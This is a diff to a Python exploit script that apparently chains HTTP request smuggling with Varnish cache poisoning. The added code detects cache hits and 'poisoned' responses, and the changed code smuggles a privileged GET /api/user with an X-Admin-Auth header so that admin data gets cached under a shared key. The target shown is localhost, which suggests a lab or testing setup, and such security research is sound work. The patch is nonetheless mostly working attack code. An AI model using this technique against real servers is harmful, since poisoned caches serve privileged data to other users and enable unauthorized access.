@@ -14,6 +14,26 @@ def send_request(raw):
     return data.decode("iso-8859-1", errors="replace")
 
 
+def is_cache_hit(resp_text):
+    """CACHE HIT: X-Varnish has two numbers (e.g. '32777 11') or Age > 0."""
+    headers, _, body = resp_text.partition("\r\n\r\n")
+    age_val = None
+    x_varnish = ""
+    for line in headers.split("\r\n"):
+        if line.lower().startswith("age:"):
+            try:
+                age_val = int(line.split(":", 1)[1].strip())
+            except (ValueError, IndexError):
+                pass
+        if line.lower().startswith("x-varnish:"):
+            x_varnish = line.split(":", 1)[1].strip() if ":" in line else ""
+    # Varnish hit: header often has two IDs (e.g. "32777 11")
+    two_ids = len(x_varnish.split()) >= 2 and all(
+        p.strip().isdigit() for p in x_varnish.split()[:2]
+    )
+    return two_ids or (age_val is not None and age_val > 0)
+
+
 def print_cache_status(resp_text, label=""):
     headers, _, body = resp_text.partition("\r\n\r\n")
     age = ""
@@ -23,7 +43,14 @@ def print_cache_status(resp_text, label=""):
             age = line
         if line.lower().startswith("x-varnish:"):
             x_varnish = line
-    hit_or_miss = "CACHE HIT" if "Age:" in headers or "X-Varnish" in headers else "CACHE MISS"
+    hit = is_cache_hit(resp_text)
+    poisoned = "ADMIN" in body or "secret_key" in body or "PRIVILEGED" in body
+    if hit and poisoned:
+        hit_or_miss = "CACHE HIT (POISONED)"
+    elif hit:
+        hit_or_miss = "CACHE HIT"
+    else:
+        hit_or_miss = "CACHE MISS"
     print(f"[{label}] {hit_or_miss}")
     if age:
         print(f"    {age}")
@@ -34,12 +61,12 @@ def print_cache_status(resp_text, label=""):
 
 def build_smuggling_post_for_poison():
     """
-    Smuggle a privileged GET /api/user with X-Admin-Auth into the backend.
+    Smuggle a privileged GET /api/user (no query string) with X-Admin-Auth into the backend.
     The backend returns admin-flavoured JSON which Varnish then caches
-    under the collapsed /api/user cache key.
+    under the path-only /api/user cache key.
     """
     smuggled = (
-        "GET /api/user?id=guest HTTP/1.1\r\n"
+        "GET /api/user HTTP/1.1\r\n"
         "Host: localhost\r\n"
         "X-Admin-Auth: secret-token\r\n"
         "\r\n"
@@ -86,8 +113,8 @@ def main():
     print("\n--- Response to smuggling POST ---")
     print(resp2)
 
-    print("\n[STEP 2] Waiting 500ms before trigger request.")
-    time.sleep(0.5)
+    print("\n[STEP 2] Waiting 1s before trigger request (ensure smuggled bytes buffered).")
+    time.sleep(1.0)
 
     # STEP 3 - Trigger smuggled request
     print("\n[STEP 3] Triggering smuggled /api/user by sending benign GET /api/user")
